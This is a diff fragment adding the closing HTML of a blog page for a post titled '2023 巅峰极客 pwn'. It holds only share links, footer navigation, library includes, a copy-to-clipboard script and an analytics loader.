+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&text=2023 巅峰极客 pwn"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&is_video=false&description=2023 巅峰极客 pwn"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 巅峰极客 pwn&body=Check out this article: https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&title=2023 巅峰极客 pwn"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&name=2023 巅峰极客 pwn&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/&t=2023 巅峰极客 pwn"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
